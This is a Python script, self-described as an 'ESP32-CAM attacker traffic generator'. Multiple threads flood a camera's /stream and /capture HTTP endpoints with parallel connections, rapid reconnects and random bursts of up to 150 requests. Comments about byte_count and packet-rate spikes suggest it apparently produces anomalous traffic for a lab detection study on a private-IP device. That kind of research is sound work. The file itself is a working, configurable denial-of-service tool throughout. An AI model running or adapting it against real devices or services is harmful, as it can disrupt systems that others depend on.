#!/bin/python3
import argparse
import threading
import time
import requests
import random
import os

def log(msg: str):
    now = time.strftime("%H:%M:%S")
    print(f"[{now}] {msg}")


# ============================================================
# 1) EXTREME STREAM WORKER (port 8081)
# ============================================================
def stream_worker(url: str, duration: int, worker_id: int):
    end_time = time.time() + duration
    reconnect_delay = [0.1, 0.2, 0.3, 0.5]

    while time.time() < end_time:
        try:
            log(f"[stream-{worker_id}] opening stream {url}")
            with requests.get(url, stream=True, timeout=5) as r:
                for chunk in r.iter_content(chunk_size=2048):
                    if time.time() >= end_time:
                        break

                    # Random big read to create irregular byte_count patterns
                    if random.random() < 0.02:
                        _ = r.content
        except Exception as e:
            log(f"[stream-{worker_id}] error: {e}")

        # Random reconnect jitter
        time.sleep(random.choice(reconnect_delay))

        # Random "burst reconnections" → massive PPS spikes
        if random.random() < 0.15:
            for _ in range(random.randint(3, 8)):
                try:
                    requests.get(url, timeout=1)
                except:
                    pass
                time.sleep(0.05)


# ============================================================
# 2) EXTREME SNAPSHOT WORKER (port 8080)
# ============================================================
def snapshot_worker(url: str, duration: int, rps: float, worker_id: int):
    end_time = time.time() + duration
    interval = 1.0 / max(rps, 0.1)

    while time.time() < end_time:
        t0 = time.time()
        try:
            log(f"[snap-{worker_id}] GET {url}")
            r = requests.get(url, timeout=3)
            _ = r.content
        except Exception as e:
            log(f"[snap-{worker_id}] error: {e}")

        # Random microburst for extreme packet_count / pps spikes
        if random.random() < 0.10:
            for _ in range(random.randint(2, 6)):
                try:
                    requests.get(url, timeout=1)
                except:
                    pass

        elapsed = time.time() - t0
        sleep_time = interval - elapsed
        if sleep_time > 0:
            time.sleep(sleep_time)


# ============================================================
# 3) EXTREME OVERDRIVE MODE (long quiet → sudden huge bursts)
# ============================================================
def overdrive_worker(url: str, duration: int):
    end_time = time.time() + duration

    while time.time() < end_time:
        # Quiet phase
        time.sleep(random.randint(20, 60))

        burst_len = random.randint(50, 150)
        log(f"[overdrive] BURST x{burst_len}")

        # Extreme burst spam
        for _ in range(burst_len):
            try:
                requests.get(url, timeout=1)
            except:
                pass
            time.sleep(random.uniform(0.002, 0.01))


# ============================================================
# Main
# ============================================================
def main():
    parser = argparse.ArgumentParser(
        description="Extreme ESP32-CAM attacker traffic generator (fixed ports)"
    )
    parser.add_argument("--target", default="192.168.0.2",
                        help="ESP32-CAM base IP")
    parser.add_argument("--duration", type=int, default=600,
                        help="Attack duration in seconds")
    parser.add_argument("--mode",
        choices=["stream", "snapshot", "mixed", "extreme"],
        default="mixed"
    )
    parser.add_argument("--streams", type=int, default=8,
                        help="Parallel /stream workers")
    parser.add_argument("--snapshot-rps", type=float, default=12.0,
                        help="Total snapshot RPS")
    parser.add_argument("--snapshot-workers", type=int, default=8,
                        help="Snapshot worker threads")

    args = parser.parse_args()

    # Correct ports
    stream_url  = f"http://{args.target}:8081/stream"
    capture_url = f"http://{args.target}:8080/capture"

    log(f"Stream URL : {stream_url}")
    log(f"Capture URL: {capture_url}")
    log(f"Mode: {args.mode}, duration: {args.duration}s")

    threads = []

    # STREAM workers (8081)
    if args.mode in ("stream", "mixed", "extreme"):
        for i in range(args.streams):
            t = threading.Thread(
                target=stream_worker,
                args=(stream_url, args.duration, i),
                daemon=True
            )
            threads.append(t)

    # SNAPSHOT workers (8080)
    if args.mode in ("snapshot", "mixed", "extreme"):
        per_worker_rps = args.snapshot_rps / max(args.snapshot_workers, 1)
        for i in range(args.snapshot_workers):
            t = threading.Thread(
                target=snapshot_worker,
                args=(capture_url, args.duration, per_worker_rps, i),
                daemon=True
            )
            threads.append(t)

    # EXTREME OVERDRIVE (8080 bursts)
    if args.mode == "extreme":
        t = threading.Thread(
            target=overdrive_worker,
            args=(capture_url, args.duration),
            daemon=True
        )
        threads.append(t)

    # Start all threads
    for t in threads:
        t.start()

    log(f"Started {len(threads)} workers")
    time.sleep(args.duration)
    log("Done (threads exit automatically)")


if __name__ == "__main__":
    main()